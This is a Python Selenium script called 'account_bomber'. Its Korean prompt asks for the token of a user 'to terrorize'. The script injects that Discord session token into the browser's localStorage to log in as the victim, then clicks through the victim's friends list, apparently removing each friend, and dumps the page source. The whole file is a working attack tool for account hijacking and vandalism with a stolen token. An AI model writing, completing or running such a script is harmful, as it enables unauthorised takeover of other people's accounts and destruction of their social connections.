from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import time


def account_bomber():
    token = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] 테러할 유저 토큰 입력: ")
    options = Options()
    # headless 오류 때문에 수정 필요
    options.headless = True

    driver = webdriver.Chrome(options=options)

    driver.get(url="https://discord.com/app")
    script = f"""
    function login(token) {{
    setInterval(() => {{
    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${{token}}"`
    }}, 50);
    setTimeout(() => {{
    location.reload();
    }}, 2500);
    }}
    
    login({token!r})
    """
    driver.implicitly_wait(5)
    driver.execute_script(script=script)
    driver.set_window_size(1920, 1080)

    show_all_friend_nav = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, "div.tabBar-ra-EuL.topPill-3DJJNV :nth-child(2)")))
    show_all_friend_nav.click()

    try:
        extra_buttons = WebDriverWait(driver, 10).until(
            EC.presence_of_all_elements_located((By.CSS_SELECTOR, "svg.icon-1WVg4I")))[1::2]
    except TimeoutException:
        return


    print(driver.page_source)
    for extra_button in extra_buttons:
        extra_button.click()
        driver.implicitly_wait(5)
        driver.find_elements(By.CSS_SELECTOR, "div.label-2gNW3x")[2].click()
        driver.implicitly_wait(5)
        driver.find_element(By.CSS_SELECTOR, ".lookFilled-yCfaCM > div.contents-3ca1mk").click()

    time.sleep(10)
    driver.quit()


account_bomber()
